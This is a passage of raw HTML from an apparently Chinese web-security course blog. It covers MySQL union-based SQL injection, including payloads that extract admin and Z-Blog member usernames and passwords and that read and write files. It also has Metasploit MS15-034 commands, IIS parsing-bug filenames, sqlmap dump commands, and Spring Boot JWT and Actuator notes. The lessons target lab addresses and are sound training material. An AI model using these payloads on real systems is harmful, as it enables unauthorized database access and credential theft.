class="line">information_schema.tables：记录表名信息的表  </span><br><span class="line">information_schema.columns：记录列名信息表  </span><br><span class="line">schema_name：information_schema.schemata记录数据库名信息的列名值  </span><br><span class="line">table_schema：information_schema.tables记录数据库名的列名值  </span><br><span class="line">table_name：information_schema.tables记录表名的列名值  </span><br><span class="line">column_name：information_schema.columns记录列名的列名值  </span><br><span class="line"></span><br><span class="line">order by 6 </span><br><span class="line">union select 1,2,3,4,5,6</span><br><span class="line">union select 1,2,3,database(),user(),6</span><br><span class="line">union select 1,2,3,version(),@@version_compile_os,6</span><br><span class="line">union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=&#x27;demo01&#x27;</span><br><span class="line">union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name=&#x27;admin&#x27;</span><br><span class="line">union select 1,2,3,username,password,6 from admin limit 0,1</span><br></pre></td></tr></table></figure><h2 id="PHP-MYSQL-SQL跨库查询"><a href="#PHP-MYSQL-SQL跨库查询" class="headerlink" title="PHP-MYSQL-SQL跨库查询"></a>PHP-MYSQL-SQL跨库查询</h2><p>影响条件：当前数据库ROOT用户权限<br>测试不同数据库用户：root demo   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata</span><br><span class="line">union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=&#x27;zblog&#x27;</span><br><span class="line">union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name=&#x27;zbp_member&#x27; and table_schema=&#x27;zblog&#x27;</span><br><span class="line">union select 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member</span><br></pre></td></tr></table></figure><h2 id="PHP-MYSQL-SQL文件读写"><a href="#PHP-MYSQL-SQL文件读写" class="headerlink" title="PHP-MYSQL-SQL文件读写"></a>PHP-MYSQL-SQL文件读写</h2><p>影响条件：<br>1、当前数据库用户权限<br>2、secure-file-priv设置<br>测试不同数据库用户：root demo  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,load_file(&#x27;d:\\1.txt&#x27;),3,4,5,6</span><br><span class="line">union select 1,&#x27;xiaodi&#x27;,3,4,5,6 into outfile &#x27;d:\\2.txt&#x27;</span><br></pre></td></tr></table></figure><p>读写的路径的问题：<br>1、报错显示获取路径<br>2、phpinfo页面泄漏<br>如果不知道路径思路：<br>利用常见的默认的中间件，数据库等安装路径读取有价值信息<br>[<a href="https://blog.csdn.net/weixin_30795127/article/details/96558708]">https://blog.csdn.net/weixin_30795127/article/details/96558708]</a>  </p><p>access无数据库用户<br>mysql里面有内置的管理用户，其中root就是默认数据库管理员用户<br>网站上面的数据库都在mysql中，由root或一对一用户去管理  </p><h2 id="1、数据库统一管理（root用户）"><a href="#1、数据库统一管理（root用户）" class="headerlink" title="1、数据库统一管理（root用户）"></a>1、数据库统一管理（root用户）</h2><p>每个网站的数据库都由root用户统一管理<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">root(自带默认)</span><br><span class="line">网站A  testA</span><br><span class="line">网站B  testB</span><br></pre></td></tr></table></figure><h2 id="2、数据库一对一管理（不同用户）"><a href="#2、数据库一对一管理（不同用户）" class="headerlink" title="2、数据库一对一管理（不同用户）"></a>2、数据库一对一管理（不同用户）</h2><p>自己的网站单独创建数据库用户去管理自己的数据库<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库zblog用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库demo用户  demo01  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">testA用户</span><br><span class="line">网站A  testA</span><br><span class="line">testb用户</span><br><span class="line">网站B  testB</span><br></pre></td></tr></table></figure><p>接受的参数值未进行过滤直接带入SQL查询的操作 就是SQL注入产生的原理攻击：利用SQL语句执行你想要的东西（SQL语句能干嘛，注入就能干嘛）<br>SQL语句能干嘛 &#x3D; SQL语句由谁决定 &#x3D;&gt; 数据库类型决定 (为什么mysql注入 oracle注入叫法原因)  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:63342/demo01/new.php?id=3</span><br><span class="line">select * from news where id=3</span><br><span class="line"></span><br><span class="line">http://localhost:63342/demo01/new.php?id=3 union select 1,2,username,password,5,6 from admin</span><br><span class="line">select * from news where id=3 union select 1,2,username,password,5,6 from admin</span><br></pre></td></tr></table></figure><p>access注入 sqlmap  靠字典去猜 又可能猜不到表名 列名  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">demo01</span><br><span class="line">admin</span><br><span class="line">username,password,id</span><br><span class="line">数据</span><br><span class="line">Zblog</span><br><span class="line">zbp_member</span><br><span class="line">mem_Name,mem_Password</span><br><span class="line">数据</span><br><span class="line">Access（单个）</span><br><span class="line">表名</span><br><span class="line">列名（字段）</span><br><span class="line">数据</span><br></pre></td></tr></table></figure><p>目的：获取数据<br>肯定一步步得到信息  </p><p>查询数据库名demo01下的表名信息（借助information_schema.tables存储查询）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=&#x27;demo01&#x27;</span><br></pre></td></tr></table></figure><p>查询数据库名demo01下的表名admin的列名信息（借助information_schema.columns存储查询）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=&#x27;demo01&#x27; and table_name=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><h2 id="跨库查询："><a href="#跨库查询：" class="headerlink" title="跨库查询："></a>跨库查询：</h2><ul><li><p>1、数据库统一管理（root用户）<br>每个网站的数据库都由root用户统一管理<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01  </p></li><li><p>2、跨库注入<br>通过B网站的注入点获取A网站的账号密码</p></li></ul><p>获取mysql下所有数据库名：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata</span><br><span class="line"></span><br><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=&#x27;zblog&#x27;</span><br><span class="line"></span><br><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=&#x27;zblog&#x27; and table_name=&#x27;zbp_member&#x27;</span><br></pre></td></tr></table></figure><p>解决：单引号过滤绕过方式<br>SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>41WEB攻防-ASP应用</title>
      <link href="/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p> <img src="/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/image4.png"></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>1、ASP-SQL注入-Access数据库</li><li>2、ASP-默认安装-数据库泄漏下载</li><li>3、ASP-IIS-CVE&amp;短文件&amp;解析&amp;写入</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><h2 id="ASP-默认安装-MDB数据库泄漏下载"><a href="#ASP-默认安装-MDB数据库泄漏下载" class="headerlink" title="ASP-默认安装-MDB数据库泄漏下载"></a>ASP-默认安装-MDB数据库泄漏下载</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于大部分ASP程序与ACCESS数据库搭建，但ACCESS无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解密数据实现攻击。  </p><h2 id="ASP-中间件-CVE-短文件-解析-写权限"><a href="#ASP-中间件-CVE-短文件-解析-写权限" class="headerlink" title="ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限"></a>ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限</h2><h3 id="HTTP-SYS（CVE-2015-1635）"><a href="#HTTP-SYS（CVE-2015-1635）" class="headerlink" title="HTTP.SYS（CVE-2015-1635）"></a>HTTP.SYS（CVE-2015-1635）</h3><ul><li>1、漏洞描述<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</li><li>2、影响版本<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</li><li>3、漏洞利用条件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本</li><li>4、漏洞复现(kali)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  </span><br><span class="line">use auxiliary/dos/http/ms15_034_ulonglongadd</span><br><span class="line">set rhosts xx.xx.xx.xx</span><br><span class="line">set rport xx</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><h3 id="IIS短文件"><a href="#IIS短文件" class="headerlink" title="IIS短文件"></a>IIS短文件</h3><ul><li>1、描述：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。</li><li>2、漏洞成因:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir &#x2F;x</li><li>3、应用场景：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后台路径获取，数据库文件获取，其他敏感文件获取等</li><li>4、利用工具：<br><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a><br><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a></li></ul><h3 id="IIS文件解析"><a href="#IIS文件解析" class="headerlink" title="IIS文件解析"></a>IIS文件解析</h3><p>IIS 6 解析漏洞<br>1、该版本默认会将*.asp;.jpg 此种格式的文件名，当成Asp解析<br>2、该版本默认会将*.asp&#x2F;目录下的所有文件当成Asp解析。<br>如：logo.asp;.jpg xx.asp&#x2F;logo.jpg<br>IIS 7.x 解析漏洞<br>在一个文件路径(&#x2F;xx.jpg)后面加上&#x2F;xx.php会将&#x2F;xx.jpg&#x2F;xx.php 解析为php文件<br>应用场景：配合文件上传获取Webshell  </p><h3 id="IIS写权限"><a href="#IIS写权限" class="headerlink" title="IIS写权限"></a>IIS写权限</h3><p>IIS&lt;&#x3D;6.0 目录权限开启写入，开启WebDAV，设置为允许<br>参考利用：<a href="https://cloud.tencent.com/developer/article/2050105">https://cloud.tencent.com/developer/article/2050105</a>  </p><h2 id="ASP-SQL注入-SQLMAP使用-ACCESS注入"><a href="#ASP-SQL注入-SQLMAP使用-ACCESS注入" class="headerlink" title="ASP-SQL注入-SQLMAP使用&amp;ACCESS注入"></a>ASP-SQL注入-SQLMAP使用&amp;ACCESS注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ACCESS数据库无管理帐号密码，顶级架构为表名，列名（字段），数据，所以在注入猜解中一般采用字典猜解表和列再获取数据，猜解简单但又可能出现猜解不到的情况，由于Access数据库在当前安全发展中已很少存在，故直接使用SQLMAP注入，后续再说其他。  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;&quot; --tables //获取表名</span><br><span class="line">python sqlmap.py -u &quot;&quot; --columns -T admin //获取admin表名下的列名</span><br><span class="line">python sqlmap.py -u &quot;&quot; --dump -C &quot;&quot; -T admin  //获取表名下的列名数据</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>40安全开发-JavaEE应用</title>
      <link href="/2023/10/18/40%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/40%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>50、JavaEE-SpringBoot-身份鉴权-JWT技术</li><li>51、JavaEE-SpringBoot-打包部署-JAR&amp;WAR</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，架构分析，待补充</li></ul><p> <img src="/2023/10/18/40%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/JWT.png"></p><h2 id="SpringBoot-身份鉴权-JWT技术"><a href="#SpringBoot-身份鉴权-JWT技术" class="headerlink" title="SpringBoot-身份鉴权-JWT技术"></a>SpringBoot-身份鉴权-JWT技术</h2><p>[<a href="https://zhuanlan.zhihu.com/p/394138133]">https://zhuanlan.zhihu.com/p/394138133]</a><br>JWT(JSON Web Token)是由服务端用加密算法对信息签名来保证其完整性和不可伪造；<br>Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息；<br>JWT用于身份认证、会话维持等。由三部分组成，header、payload与signature。<br>参考：<a href="https://cloud.tencent.com/developer/article/2101634">https://cloud.tencent.com/developer/article/2101634</a>  </p><ul><li>1、引入依赖  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.auth0&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;java-jwt&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">3.4</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li><li>2、创建JWT  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT.create()  </span><br></pre></td></tr></table></figure></li><li>3、配置JWT  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">JWT.create()  </span><br><span class="line"><span class="comment">//header</span></span><br><span class="line">.withHeader(map)</span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line">.withClaim(<span class="string">&quot;userid&quot;</span>,id)</span><br><span class="line">.withClaim(<span class="string">&quot;username&quot;</span>,user)</span><br><span class="line">.withClaim(<span class="string">&quot;password&quot;</span>,pass)</span><br><span class="line"><span class="comment">//signature</span></span><br><span class="line">.sign(Algorithm.HMAC256(<span class="string">&quot;xiaodisec&quot;</span>));</span><br></pre></td></tr></table></figure></li><li>4、解析JWT  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构建解密注册</span></span><br><span class="line"><span class="type">JWTVerifier</span> <span class="variable">jwt</span> <span class="operator">=</span> JWT.require(Algorithm.HMAC256(<span class="string">&quot;xiaodisec&quot;</span>)).build();</span><br><span class="line"><span class="comment">//解密注册数据</span></span><br><span class="line"><span class="type">DecodedJWT</span> <span class="variable">verify</span> <span class="operator">=</span> jwt.verify(jwtdata);</span><br><span class="line"><span class="comment">//提取解密数据</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">userid</span> <span class="operator">=</span> verify.getClaim(<span class="string">&quot;userid&quot;</span>).asInt();</span><br></pre></td></tr></table></figure></li><li>5、安全问题<br>参考：<a href="https://cloud.tencent.com/developer/article/2101634">https://cloud.tencent.com/developer/article/2101634</a></li></ul><h2 id="SpringBoot-打包部署-JAR-WAR"><a href="#SpringBoot-打包部署-JAR-WAR" class="headerlink" title="SpringBoot-打包部署-JAR&amp;WAR"></a>SpringBoot-打包部署-JAR&amp;WAR</h2><p>参考：<a href="https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg">https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg</a>  </p><h3 id="SpringBoot项目打包在linux服务器中运行"><a href="#SpringBoot项目打包在linux服务器中运行" class="headerlink" title="SpringBoot项目打包在linux服务器中运行:"></a>SpringBoot项目打包在linux服务器中运行:</h3><p>①jar类型项目<br>jar类型项目使用SpringBoot打包插件打包时，会在打成的jar中内置tomcat的jar。<br>所以使用jdk直接运行jar即可，jar项目中功能将代码放到其内置的tomcat中运行。<br>②war类型项目<br>在打包时需要将内置的tomcat插件排除，配置servlet的依赖和修改pom.xml，然后将war文件放到tomcat安装目录webapps下,启动运行tomcat自动解析即可。  </p><h3 id="Jar打包"><a href="#Jar打包" class="headerlink" title="Jar打包"></a>Jar打包</h3><p>报错解决：<br><a href="https://blog.csdn.net/Mrzhuangr/article/details/124731024">https://blog.csdn.net/Mrzhuangr/article/details/124731024</a><br><a href="https://blog.csdn.net/wobenqingfeng/article/details/129914639">https://blog.csdn.net/wobenqingfeng/article/details/129914639</a><br>1、maven-clean-package<br>2、java -jar xxxxxx.jar  </p><h3 id="War打包"><a href="#War打包" class="headerlink" title="War打包"></a>War打包</h3><ul><li>1、pom.xml加入或修改：<br><packaging>war</packaging>  </li><li>2、启动类里面加入配置：  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSwaggerDemoApplication</span> <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> SpringApplicationBuilder <span class="title function_">configure</span><span class="params">(SpringApplicationBuilder builder)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> builder.sources(TestSwaggerDemoApplication.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>3、maven-clean-package</li><li>4、war放置tomcat后启动</li></ul><p>JAVAEE源码架构：<br>无源码下载泄漏风险<br>源码泄漏也需反编译  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>39安全开发-JavaEE应用</title>
      <link href="/2023/10/18/39%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/39%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>47、JavaEE-SpringBoot-监控系统-Actuator</li><li>48、JavaEE-SpringBoot-接口系统-Swagger</li><li>49、JavaEE-SpringBoot-监控&amp;接口&amp;安全问题</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，，架构分析待补充</li></ul><p> <img src="/2023/10/18/39%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/actuator.png"></p><h2 id="SpringBoot-监控系统-Actuator"><a href="#SpringBoot-监控系统-Actuator" class="headerlink" title="SpringBoot-监控系统-Actuator"></a>SpringBoot-监控系统-Actuator</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SpringBoot Actuator模块提供了生产级别的功能，比如健康检查，审计，指标收集，HTTP跟踪等，帮助我们监控和管理Spring Boot应用。<br>-开发使用：  </p><h3 id="1、引入依赖"><a href="#1、引入依赖" class="headerlink" title="1、引入依赖"></a>1、引入依赖</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="2、配置监控"><a href="#2、配置监控" class="headerlink" title="2、配置监控"></a>2、配置监控</h3><ul><li>暴露:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#application.properties</span><br><span class="line">management.endpoints.web.exposure.include=*</span><br><span class="line"></span><br><span class="line">#application.yml</span><br><span class="line">management:</span><br><span class="line">  endpoints:</span><br><span class="line">    web:</span><br><span class="line">      exposure:</span><br><span class="line">        include: &#x27;*&#x27;</span><br></pre></td></tr></table></figure></li><li>安全配置：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#application.properties</span><br><span class="line">management.endpoint.env.enabled=false</span><br><span class="line">management.endpoint.heapdump.enabled=false</span><br><span class="line"></span><br><span class="line">#application.yml</span><br><span class="line">management:</span><br><span class="line">    endpoint:</span><br><span class="line">        heapdump:</span><br><span class="line">            enabled: false #启用接口关闭</span><br><span class="line">    env:</span><br><span class="line">        enabled: false #启用接口关闭</span><br></pre></td></tr></table></figure></li><li>2、1 图像化Server&amp;Client端界面<br>Server：引入Server依赖-开启（@EnableAdminServer）<br>Client：引入Client依赖-配置（连接目标，显示配置等）</li></ul><h3 id="3、安全问题"><a href="#3、安全问题" class="headerlink" title="3、安全问题"></a>3、安全问题</h3><ul><li>heapdump泄漏<br>jvisualvm分析器(安装java后直接搜索jvisualvm)<br>JDumpSpider提取器<br><a href="https://github.com/whwlsfb/JDumpSpider/releases">https://github.com/whwlsfb/JDumpSpider/releases</a><br>分析提取出敏感信息（配置帐号密码，接口信息 数据库 短信 云应用等配置）  </li><li>其他利用见下文<br><a href="https://blog.csdn.net/drnrrwfs/article/details/125242990">https://blog.csdn.net/drnrrwfs/article/details/125242990</a><br>分析得到有一些组件（不安全的组件，如log4j）</li></ul><h2 id="SpringBoot-接口系统-Swagger"><a href="#SpringBoot-接口系统-Swagger" class="headerlink" 